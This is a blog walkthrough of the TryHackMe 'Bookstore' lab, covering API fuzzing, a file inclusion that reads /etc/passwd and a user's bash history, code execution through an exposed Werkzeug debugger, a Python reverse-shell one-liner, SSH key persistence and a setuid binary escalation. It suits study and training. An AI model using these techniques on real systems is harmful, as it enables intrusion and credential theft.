---
layout: post
title: TryHackMe Walkthrough - Bookstore
date: 2021-07-04
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
permalink: /2021/07/Bookstore
img: 2021/07/Bookstore/Bookstore.jpeg
---

This was an interesting room where I had to enumerate an API to find a file inclusion vulnerability. Then use a debugger console to execute code on the server. And finally reverse a program to get root. 

* Room: Bookstore
* Difficulty: Medium
* URL: [https://tryhackme.com/room/bookstoreoc](https://tryhackme.com/room/bookstoreoc)
* Author: [sidchn](https://tryhackme.com/p/sidchn)

```
A Beginner level box with basic web enumeration and REST API Fuzzing.
```

## Enumeration

As always, I started by scanning for opened ports. 

```bash
$ rustscan -a target -- -A -script vuln 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

Open 10.10.110.220:22
Open 10.10.110.220:80
Open 10.10.110.220:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
```

It found 3 opened ports: 22 (SSH), 80 (HTTP), and 5000, a non standard port.

## Web Site
I looked at the web site. The site is mostly static. There is a form on the main page. The content get posted, but we don't get any feedback. 

!["Main Page"](/assets/images/2021/07/Bookstore/01_Bookstore.png "Main page")

There is a login page. I tried it, the credentials are pass through GET parameters and just like the form, there are no feedback from the server.

Looking at the source code, there is an interesting comment. 

```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

Apparently there is a pin hidden in the bash history of the sid user. And there is also a debugger that we can use somewhere. This might be useful later on.

I then looked at the Books page. 

!["Books"](/assets/images/2021/07/Bookstore/02_Books.png "Books")

I looked at the source again and found an encoded string that looked interesting. 
```html
<!--GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS=== -->
```

I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)From_Hex('Space')&input=R1k0Q0FOWlVFQTNUSUlCWEdBUURPTVpBR05RU0FNVEdFQVpHTUlCWEc0UURPTlpBRzQzU0FNVEZFQTNUU0lCV01ZUURPTkpBRzQyQ0FOWlZFQTNERUlCV0dVUURFWkpBR1laU0FOVEdFQTNHSUlCU01ZUURPTlpBR1lZU0FOWlVFQTNER0lCV0hBUURHWlJBRzQzQ0FNM0VFQTJUSUlCWEdRUURHTlpBR1laQ0FOM0JFQTNUUUlCWEdVUURPTVJBR1JRU0FNWlJFQTJEUz09PQ) to decode it. But it only contained a link to a [YouTube video](https://www.youtube.com/watch?v=Tt7bzxurJ1I).

## The API

The books page load the books through an API that sits of port 5000.

```html
GET /api/v2/resources/books/random4 HTTP/1.1
Host: target.thm:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target.thm/books.html
Origin: http://target.thm
Connection: close

-------

HTTP/1.0 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: http://target.thm
Vary: Origin
Content-Length: 1078
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sat, 03 Jul 2021 23:20:10 GMT

[
  {
    "author": "Larry Niven", 
    "first_sentence": "In the nighttime heart of Beirut, in one of a row of general-address transfer booths, Louis Wu flicked into reality.", 
    "id": "46", 
    "published": 1971, 
    "title": "Ringworld"
  }, 
  ...
```

I started looking around the API, trying to find other endpoints. At `/api`, I found some documentation about the API.

```html
GET /api HTTP/1.1
Host: target.thm:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target.thm/books.html
Origin: http://target.thm
Connection: close

-------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 825
Access-Control-Allow-Origin: http://target.thm
Vary: Origin
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sat, 03 Jul 2021 14:22:10 GMT


	<title>API Documentation</title>
	<h1>API Documentation</h1>
	<h3>Since every good API has a documentation we have one as well!</h3>
	<h2>The various routes this API currently provides are:</h2><br>
	<p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
	<p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
	<p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
	<p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>
```

There seemed to be only three endpoints. All on the books resource.  One of the endpoint was using parameters to filter the results it returned. 

I tried using fuzzing to look for undocumented endpoints, parameters, or breaking the existing parameters. 

The fuzzing at `/` found a [web console](http://target.thm:5000/console).

```bash
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -t10 "http://target.thm:5000/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.thm:5000/FUZZ
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002430:   200        11 L     90 W       825 Ch      "api"
000005149:   200        52 L     186 W      1985 Ch     "console"
000015551:   200        1 L      5 W        45 Ch       "robots.txt"

Total time: 0
Processed Requests: 20469
Filtered Requests: 20466
Requests/sec.: 0
```

This contained the [Werkzeug Debugger](https://werkzeug.palletsprojects.com/en/1.0.x/debug/).

!["Debugger"](/assets/images/2021/07/Bookstore/03_Debugger.png "Debugger")

This debugger is [vulnerable to remote code execution](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/), but I needed a pin to use it. 

So I kept fuzzing, but nothing else worked. 

```bash
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -t10 "http://target.thm:5000/api/v2/resources/FUZZ/all"

$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -t10 "http://target.thm:5000/api/v2/resources/books?FUZZ=1"

$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -t10 "http://target.thm:5000/api/v2/resources/books?author=FUZZ"
```

I then took a closer look at the `api.js` code and found another comment. 

```js
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

Apparently there was an older version of the API that was vulnerable. So I took the URL from the previous API call, change the version number and tried it. 

```html
GET /api/v1/resources/books?id=1 HTTP/1.1
Host: target.thm:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

-------

HTTP/1.0 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Content-Length: 237
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sat, 03 Jul 2021 23:37:59 GMT

[
  {
    "author": "Ann Leckie ", 
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
    "id": "1", 
    "published": 2014, 
    "title": "Ancillary Justice"
  }
]
```

The API seemed to work the same way. So I gave fuzzing another try, but this time on version 1 of the API. 

```bash
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -t10 "http://target.thm:5000/api/v1/resources/books?FUZZ=1"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.thm:5000/api/v1/resources/books?FUZZ=1
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002846:   200        1 L      1 W        3 Ch        "author"
000009265:   200        9 L      33 W       237 Ch      "id"
000014727:   200        1 L      1 W        3 Ch        "published"
000016445:   500        356 L    1747 W     23076 Ch    "show"

Total time: 989.4803
Processed Requests: 20469
Filtered Requests: 20465
Requests/sec.: 20.68661

```

I looks like there was a `show` parameter. Remembering the comment about the file inclusion vulnerability, I tried reading the `/etc/passwd` file.

```html
GET /api/v1/resources/books?show=/etc/passwd HTTP/1.1
Host: target.thm:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

-------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1555
Access-Control-Allow-Origin: *
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sat, 03 Jul 2021 23:43:12 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

I then tried to read the bash history file of the sid user because of the previous comment that said it contained a pin.

```html
GET /api/v1/resources/books?show=/home/sid/.bash_history HTTP/1.1
Host: target.thm:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

-------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 116
Access-Control-Allow-Origin: *
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sat, 03 Jul 2021 23:52:34 GMT

cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=REDACTED
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

Now I had the pin, so I went back to the [debugger console]( http://target.thm:5000/console) and used the pin to access it. 

The console allowed me to run any python code I wanted.

!["RCE"](/assets/images/2021/07/Bookstore/04_RCE.png "RCE")

So I started a netcat listener on my machine and used to console to start a reverse shell. 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.3.36",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

I got the shell connection and used it to read the first flag. 

```
$ nc -lkvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.110.220 44328
/bin/sh: 0: can't access tty; job control turned off

$ ls
api.py
api-up.sh
books.db
try-harder
user.txt

$ cat user.txt
REDACTED
```

I copied my public ssh key to the server.

```bash
$ nc -lkvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.40.118 48778
/bin/sh: 0: can't access tty; job control turned off

$ mkdir .ssh

$ echo "SSH PUBLIC KEY" > ~/.ssh/authorized_keys

$ chmod 700 .ssh

$ chmod 600 ~/.ssh/authorized_keys
```

And then used it to connect back to the server with ssh.

```bash
$ ssh sid@target
Warning: Permanently added the ECDSA host key for IP address '10.10.40.118' to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  4 05:50:10 IST 2021

  System load:  0.0               Processes:           94
  Usage of /:   33.9% of 7.81GB   Users logged in:     0
  Memory usage: 19%               IP address for eth0: 10.10.40.118
  Swap usage:   0%


71 packages can be updated.
51 updates are security updates.


Last login: Tue Oct 20 03:16:41 2020 from 192.168.1.6
```

## Escalate To root

Now that I was connected as sid, I looked for ways to get root. 

```bash
sid@bookstore:~$ ls -la
total 84
drwxr-xr-x 6 sid  sid   4096 Jul  3 21:49 .
drwxr-xr-x 3 root root  4096 Oct 20  2020 ..
-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid    116 Jul  3 21:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db
drwx------ 2 sid  sid   4096 Oct 20  2020 .cache
drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local
-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile
drwx------ 2 sid  sid   4096 Jul  3 21:49 .ssh
-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt

sid@bookstore:~$ file try-harder 
try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped

sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1
Incorrect Try Harder
```

The file `try-harder` belongs to root and has the suid bit set. This mean that it runs as root. I downloaded the file to my machine and opened it with Ghidra to see what it did. 

!["Decompiled main"](/assets/images/2021/07/Bookstore/05_DecompiledMain.png "Decompiled main")

The code request a number, than XOR it with 0x1116 and 0x5db3. If the result is equal to 0x5dcd21f4, it then launch bash as root. 

To get the correct number, I needed to start from the expected result and XOR it with the same two numbers. The result was the number I had to enter. 

```
0x5dcd21f4 XOR 0x1116 XOR 0x5db3 = Magic Number
```

I converted the hex value to decimal, then used it in the executable to get root.

```bash
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
Magic Number In Decimal

root@bookstore:~# whoami
root

root@bookstore:~# cat /root/root.txt 
REDACTED
```
